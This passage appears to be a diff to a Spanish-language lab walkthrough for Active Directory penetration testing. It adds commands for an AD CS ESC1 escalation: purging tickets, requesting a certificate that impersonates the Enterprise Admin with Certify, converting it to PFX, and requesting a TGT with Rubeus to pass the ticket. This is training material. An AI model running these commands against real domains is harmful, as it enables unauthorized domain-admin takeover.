@@ -1481,9 +1481,21 @@ Ahora ya podemos probar si podemos acceder
 winrs -r:dcorp-dc cmd /c set username
 ```
 
+Tendremos que limpiar los tickets
+```shell
+klist purge
+```
 Ahora para poder escalar privilegios tendremos que solicitar el certificado para el Enterprise Admin
 ```shell
 C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator /sid:S-1-5-21-335606122-960912869-3279953914-500
 ```
 
-Guardar el certificado en **
+Guardar el certificado en *esc1-EA.pem* y convertirlo a PFX
+```shell
+C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1-EA.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-EA.pfx
+```
+
+Y ahora solicitamos el TGT
+```shell
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:moneycorp.local\Administrator /dc:mcorp-dc.moneycorp.local /certificate:C:\AD\Tools\esc1-EA.pfx /password:SecretPass@123 /ptt
+```
